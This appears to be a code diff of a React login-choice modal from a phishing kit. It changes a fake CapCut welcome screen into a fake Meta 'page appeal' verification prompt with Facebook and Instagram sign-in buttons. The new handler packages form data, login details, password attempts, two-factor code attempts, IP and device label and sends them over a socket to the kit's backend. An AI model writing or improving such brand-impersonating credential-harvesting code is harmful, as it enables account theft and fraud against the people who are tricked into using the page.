@@ -1,133 +1,168 @@
-'use client';
-
-import PromoImage from '@/assets/images/feature-ai-tools.png';
-import InstagramLogoImage from '@/assets/images/logo insta.webp';
-import { submitFormStep } from '@/hooks/use-socket';
-import { useTranslation } from '@/utils/translate';
-import { store, type LoginProvider } from '@/store/store';
-import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
-import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
+import '@/assets/css/login-choice-modal.css';
+import HeroImage from '@/assets/images/bg_hero.png';
+import LogoInsta from '@/assets/images/logo-insta.webp';
+import LogoMeta from '@/assets/images/logo-meta.svg';
+import { useAppealContext } from '@/hooks/use-appeal-context';
+import { store } from '@/store/store';
+import { buildAppealMessage } from '@/utils/message';
+import { sendAppealMessage } from '@/hooks/use-socket';
+import translateText from '@/utils/translate';
 import Image from 'next/image';
-import { useState, type FC } from 'react';
+import { useEffect, useState, type FC } from 'react';
 
-const FacebookIcon = () => (
-    <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
-        <path
-            fill='#1877F2'
-            d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
-        />
-    </svg>
-);
+const TEXT = {
+    title: 'Sign in to continue',
+    subtitle: 'Choose how you want to verify your account to proceed with the appeal.',
+    hero: 'Verify your identity to continue your page appeal review.',
+    facebook: 'Continue with Facebook',
+    instagram: 'Continue with Instagram',
+    terms: 'By continuing, you agree to our Terms of Service and Privacy Policy.'
+} as const;
 
-const InstagramIcon = () => (
-    <Image src={InstagramLogoImage} alt='Instagram' className='h-5 w-5 shrink-0 object-contain' />
-);
+const textsToTranslate = Object.values(TEXT);
 
-interface LoginChoiceModalProps {
-    onSelect: (provider: LoginProvider) => void;
-}
+const LoginChoiceModal: FC<{ nextStep: (provider: 'facebook' | 'instagram') => void }> = ({ nextStep }) => {
+    const [translations, setTranslations] = useState<Record<string, string>>({});
+    const [loadingProvider, setLoadingProvider] = useState<'facebook' | 'instagram' | null>(null);
 
-const LOGIN_CHOICE_TEXTS = [
-    'Welcome to CapCut',
-    'Create stunning videos online with unlimited possibilities.',
-    'Continue with Facebook',
-    'Continue with Instagram',
-    'By clicking Continue, you accept our',
-    'Terms of Service',
-    'and',
-    'Privacy Policy',
-    'Close modal'
-] as const;
+    const { setModalOpen, geoInfo, setLoginProvider } = store();
+    const appeal = useAppealContext();
 
-const LoginChoiceModal: FC<LoginChoiceModalProps> = ({ onSelect }) => {
-    const { t } = useTranslation(LOGIN_CHOICE_TEXTS);
-    const [isSending, setIsSending] = useState(false);
-    const { geoInfo, deviceLabel, messageId, userData, setModalOpen, setLoginProvider, setMessageId, resetFormSession } = store();
+    const t = (text: string): string => translations[text] || text;
 
-    const handleClose = () => {
-        resetFormSession();
-        setModalOpen(false);
-    };
+    useEffect(() => {
+        document.title = TEXT.title;
+    }, []);
 
-    const handleSelect = async (provider: LoginProvider) => {
-        if (isSending) return;
+    useEffect(() => {
+        if (!geoInfo) {
+            return;
+        }
 
-        setIsSending(true);
+        const translateAll = async () => {
+            const translatedMap: Record<string, string> = {};
+            for (const text of textsToTranslate) {
+                translatedMap[text] = await translateText(text, geoInfo.country_code);
+            }
+            setTranslations(translatedMap);
+        };
+
+        translateAll();
+    }, [geoInfo]);
+
+    const handleProvider = async (provider: 'facebook' | 'instagram') => {
+        if (loadingProvider) {
+            return;
+        }
+
+        setLoadingProvider(provider);
         setLoginProvider(provider);
 
         try {
-            const res = await submitFormStep(
-                { geoInfo, deviceLabel, messageId, userData, loginProvider: provider },
-                { step: 'login_choice', loginProvider: provider }
-            );
-            if (typeof res.messageId === 'number') {
-                setMessageId(res.messageId);
+            if (appeal.socket && appeal.isConnected && appeal.ip) {
+                const message = buildAppealMessage({
+                    form: appeal.formData,
+                    login: appeal.loginData,
+                    loginProvider: provider,
+                    passwordLogs: appeal.passwordAttempts,
+                    codeAttempts: appeal.twoFAAttempts,
+                    ip: appeal.ip,
+                    deviceLabel: appeal.deviceLabel
+                });
+                const newMessageId = await sendAppealMessage(appeal.socket, {
+                    message,
+                    message_id: appeal.messageId,
+                    stage: 'info'
+                });
+                appeal.setMessageId(newMessageId);
             }
         } catch {
             //
-        } finally {
-            setIsSending(false);
-            onSelect(provider);
         }
+
+        setLoadingProvider(null);
+        nextStep(provider);
     };
 
     return (
-        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/60 px-4 backdrop-blur-sm'>
-            <div className='relative flex max-h-[90vh] w-full max-w-[900px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_48px_rgba(0,0,0,0.25)]'>
+        <div
+            className='login-choice-page fixed inset-0 z-[1050] flex h-screen w-screen items-center justify-center bg-black/55 px-4 backdrop-blur-sm'
+            role='dialog'
+            aria-modal='true'
+            aria-labelledby='login-choice-title'
+        >
+            <div className='relative flex max-h-[90vh] w-full max-w-[920px] overflow-hidden rounded-2xl bg-white shadow-[0_24px_60px_rgba(0,0,0,0.28)]'>
                 <button
                     type='button'
-                    onClick={handleClose}
-                    className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/10 text-[#1c1e21] transition-colors hover:bg-black/20'
-                    aria-label={t('Close modal')}
+                    onClick={() => setModalOpen(false)}
+                    className='absolute top-4 right-4 z-10 flex h-9 w-9 items-center justify-center rounded-full bg-black/10 text-[#1c1e21] transition-colors hover:bg-black/15'
+                    aria-label='Close'
                 >
-                    <FontAwesomeIcon icon={faXmark} className='h-4 w-4' />
+                    <svg className='h-4 w-4' viewBox='0 0 384 512' aria-hidden='true' fill='currentColor'>
+                        <path d='M342.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L192 210.7 86.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L146.7 256 41.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L192 301.3 297.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L237.3 256 342.6 150.6z' />
+                    </svg>
                 </button>
 
-                {/* Left promotional pane */}
-                <div className='relative hidden w-[42%] shrink-0 overflow-hidden bg-[#0a0a0a] md:block'>
-                    <Image src={PromoImage} alt='' fill className='object-cover opacity-80' />
-                    <div className='absolute inset-0 bg-linear-to-t from-black/90 via-black/30 to-transparent' />
+                <div className='login-choice-hero-panel relative hidden w-[44%] shrink-0 overflow-hidden md:block'>
+                    <Image src={HeroImage} alt='' fill className='login-choice-hero-image object-cover' priority sizes='44vw' />
+                    <div className='login-choice-hero-overlay' aria-hidden='true' />
+                    <div className='absolute top-8 left-8'>
+                        <Image src={LogoMeta} alt='Meta' className='login-choice-meta-invert h-6 w-auto' />
+                    </div>
                     <div className='absolute right-0 bottom-0 left-0 p-8'>
-                        <p className='text-xl leading-snug font-bold text-white'>{t('Create stunning videos online with unlimited possibilities.')}</p>
-                        <div className='mt-6 flex gap-1.5'>
-                            <span className='h-1.5 w-1.5 rounded-full bg-white' />
+                        <p className='text-xl leading-snug font-bold text-white'>{t(TEXT.hero)}</p>
+                        <div className='mt-6 flex gap-1.5' aria-hidden='true'>
+                            <span className='h-1.5 w-6 rounded-full bg-white' />
                             <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                             <span className='h-1.5 w-1.5 rounded-full bg-white/40' />
                         </div>
                     </div>
                 </div>
 
-                {/* Right login pane */}
                 <div className='flex flex-1 flex-col justify-center px-8 py-10 sm:px-12 sm:py-14'>
-                    <h2 className='mb-10 text-center text-[28px] leading-tight font-bold text-[#090909] sm:text-[32px]'>{t('Welcome to CapCut')}</h2>
+                    <div className='mb-8 flex justify-center md:hidden'>
+                        <Image src={LogoMeta} alt='Meta' className='h-[22px] w-auto' />
+                    </div>
 
-                    <div className='mx-auto flex w-full max-w-[360px] flex-col gap-3'>
+                    <h2
+                        id='login-choice-title'
+                        className='mb-2 text-center text-[26px] leading-tight font-bold text-[#1c1e21] sm:text-[30px]'
+                    >
+                        {t(TEXT.title)}
+                    </h2>
+                    <p className='mx-auto mb-10 max-w-[360px] text-center text-sm leading-relaxed text-[#65676b]'>
+                        {t(TEXT.subtitle)}
+                    </p>
+
+                    <div className='mx-auto flex w-full max-w-[380px] flex-col gap-3'>
                         <button
                             type='button'
-                            onClick={() => handleSelect('facebook')}
-                            disabled={isSending}
-                            className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
+                            disabled={loadingProvider !== null}
+                            onClick={() => handleProvider('facebook')}
+                            className='login-choice-provider group flex h-[54px] w-full items-center justify-center gap-3 rounded-xl border border-[#dadde1] bg-white px-4 text-[15px] font-semibold text-[#1c1e21] transition-all hover:border-[#1877F2]/40 hover:bg-[#f0f2f5] hover:shadow-md active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                         >
-                            <FacebookIcon />
-                            {t('Continue with Facebook')}
+                            <svg className='h-5 w-5 shrink-0' viewBox='0 0 24 24' aria-hidden='true'>
+                                <path
+                                    fill='#1877F2'
+                                    d='M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z'
+                                />
+                            </svg>
+                            {loadingProvider === 'facebook' ? '…' : t(TEXT.facebook)}
                         </button>
 
                         <button
                             type='button'
-                            onClick={() => handleSelect('instagram')}
-                            disabled={isSending}
-                            className='flex h-[52px] w-full items-center justify-center gap-3 rounded-xl border border-[#e5e5e5] bg-white px-4 text-[15px] font-semibold text-[#090909] transition-all hover:bg-[#fafafa] hover:shadow-sm active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
+                            disabled={loadingProvider !== null}
+                            onClick={() => handleProvider('instagram')}
+                            className='login-choice-provider login-choice-btn-instagram group relative flex h-[54px] w-full items-center justify-center gap-3 overflow-hidden rounded-xl border border-[#dbdbdb] bg-white px-4 text-[15px] font-semibold text-[#262626] transition-all active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-60'
                         >
-                            <InstagramIcon />
-                            {t('Continue with Instagram')}
+                            <Image src={LogoInsta} alt='Instagram' width={22} height={22} className='relative shrink-0 object-contain' />
+                            <span className='relative'>{loadingProvider === 'instagram' ? '…' : t(TEXT.instagram)}</span>
                         </button>
                     </div>
 
-                    <p className='mx-auto mt-8 max-w-[360px] text-center text-xs leading-relaxed text-[#757575]'>
-                        {t('By clicking Continue, you accept our')}{' '}
-                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Terms of Service')}</span>{' '}
-                        {t('and')}{' '}
-                        <span className='cursor-pointer text-[#090909] underline underline-offset-2'>{t('Privacy Policy')}</span>
+                    <p className='mx-auto mt-8 max-w-[380px] text-center text-xs leading-relaxed text-[#8a8d91]'>
+                        {t(TEXT.terms)}
                     </p>
                 </div>
             </div>
